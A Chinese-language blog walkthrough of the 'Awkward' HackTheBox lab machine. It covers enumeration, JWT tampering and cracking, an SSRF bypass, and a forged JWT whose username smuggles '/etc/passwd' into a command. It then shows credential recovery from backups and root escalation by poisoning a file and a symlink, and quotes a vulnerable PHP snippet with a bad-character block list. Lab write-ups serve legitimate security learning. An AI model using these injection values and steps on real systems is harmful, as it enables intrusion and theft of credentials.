# Awkward

Awkward 是一款中等难度的机器，它突出显示了不会导致 RCE 的代码注入漏洞，而是 SSRF、LFI 和任意文件写入/追加漏洞。此外，该框还涉及通过不良的密码做法（例如密码重用）以及以纯文本形式存储密码来绕过身份验证。

---

## 外部信息收集

### 端口扫描

循例nmap

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/d6f3b199-25f0-b799-6929-eab63dacee3a.png)

### Web枚举

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/63548b1a-bc0e-44be-58ec-f802cdc97562.png)

#### Vhost枚举

ffuf

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/6639675c-b35e-0865-1818-276b7b5bb1cc.png)

从主站的开发者工具中能找到router.js，里面有几个路由

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/7878a5b5-18eb-2350-9aa9-536a8d214b7e.png)

/hr

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/916e487d-c4b5-bf6d-0cae-1259a90664df.png)

http请求里有个token，常规把guest改admin，然后刷新页面

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/8b5c0045-5f4b-109b-9fc2-322459bd7c7c.png)

跳转到了dashboard

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/61bf9bff-12d2-1339-8bff-9d5fba04f14a.png)

现在我们继续看services下的/api端点

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/bc659f0d-1456-496d-5c22-865523944566.png)

通过staff-details，我们能够获得user和密码hash

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/6e3c1269-a4a1-7381-bb38-a9e68c295097.png)

hashcat爆出一个，是christopher.jones的

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/2a669931-fb21-8a4a-7478-fee015886b4b.png)

把token重置为guest，然后到/hr登录

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/80879801-7594-d4dd-5441-63e6d5950db9.png)

#### SSRF

store-status参数是一个url，盲猜SSRF, 直接给一个url发现没成功

通过常规@符逃逸就成功了

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/c60daff8-b5d5-1f88-a798-46dd9274fcd2.png)

前面的store子域是需要登录的，密码重用没成功

通过SSRF扫内网的http服务

生成数字字典

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/d0c55a86-9781-9486-0e38-9b6050a68f21.png)

ffuf

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/bf32d32c-b907-20b2-522a-5ae1247d0b70.png)

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/5887c6e6-375c-9933-0124-5279394730b8.png)

3002披露了那几个api的后端源码

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/a013b00d-6319-d79f-a046-4b85b7a14ed3.png)

#### Foothold

值得注意的是all-leave，这里user虽然被黑名单严格检测，但依然有可乘之机, 这将通过jwt来让它妥协

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/bd090acc-5bbf-e0bc-5684-a05c3aa651e5.png)

这里的jwt是签名的，通过jhon爆破得到密钥

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/d30ceb86-349f-b9ac-c53a-36fec89eddb3.png)

生成jwt poc

```python3
import jwt


key = "123beany123"
algorithm = "HS256"
payload = {"username": "/' /etc/passwd '"}

token = jwt.encode(payload, key, algorithm=algorithm)
print(token)
```

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/a4541965-832c-d530-cb0d-0da7521bf1b0.png)

两个用户，读/home/bean/.bashrc

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/75d3ad32-5456-c315-fe56-c36eb78ab637.png)

读backup_home.sh

```bash
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```

从浏览器下.tar.gz，解压之后得到

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/dda7b41e-9029-455c-e1f0-c689e0c009ef.png)

在xpad中能看到bean的明文凭据

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/11bee282-05b6-0057-7a5c-7001b5a27337.png)

通过这个明文密码，我们可以登bean的ssh

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/263e86b5-553c-ac3e-0f00-56ca34099d00.png)

## 本地权限提升

现在，我们能够通过admin:bean的凭据 登录store子域

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/7c0677d7-e83c-99f5-2f5c-f9cc52ee3ed9.png)

同时，pspy也发现了root似乎在读leave_requests.csv后发送了一封邮件，我看到bean.hill时我想应该可以修改leave_requests.csv将username改为恶意命令来达到劫持这条命令的效果

```shell
2024/01/05 23:40:01 CMD: UID=0     PID=4834   | tail -1 /var/www/private/leave_requests.csv 
2024/01/05 23:40:01 CMD: UID=0     PID=4836   | /bin/bash /root/scripts/notify.sh 
2024/01/05 23:40:01 CMD: UID=0     PID=4841   | trivial-rewrite -n rewrite -t unix -u -c 
2024/01/05 23:40:01 CMD: UID=0     PID=4840   | mail -s Leave Request: bean.hill christine
```

然鹅/var/www/private/leave_requests.csv无权读写

在store查看时，我发现了一些txt，并且去读取了它们，这些似乎是一些http参数

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/9168c7d7-720a-7572-b4d5-f7bb7820f031.png)

grep

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/5fab8cc7-282b-a627-1296-10a7e2f68a7e.png)

在cart_actions.php中，值得关注的是这些代码

```php
//check for valid hat valley store item
function checkValidItem($filename) {
    if(file_exists($filename)) {
        $first_line = file($filename)[0];
        if(strpos($first_line, "***Hat Valley") !== FALSE) {
            return true;
...
//add to cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'add_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    if(checkValidItem("{$STORE_HOME}product-details/{$item_id}.txt")) {
        if(!file_exists("{$STORE_HOME}cart/{$user_id}")) {
            system("echo '***Hat Valley Cart***' > {$STORE_HOME}cart/{$user_id}");
        }
        system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}");
        echo "Item added successfully!";
    }
```

虽然我们依然无法直接rce，但是product-details/和cart/两个目录我们都有777权限，private/ www-data组应该有权限

在product-details/下创建一个新的4.txt，在第二行写入恶意命令

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/79e0e485-b798-88bd-659c-6a66d16f731b.png)

去到cart/创建软连接

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/99dd1622-da3c-d966-aa37-8af4fe3924ac.png)

创建cmd.sh

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/2c3a9099-c884-d8dd-e50c-6b1f7598f053.png)

请求cart_actions.php

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/ece94ae1-aa13-9458-d0e6-77bbe9aca98e.png)

不出意外它会到来，**除非手慢了**

![file](https://blog.apt250.zip/wp-content/uploads/2024/01/22818631-dc5b-6e71-b59f-3c8f1c8c1af1.png)
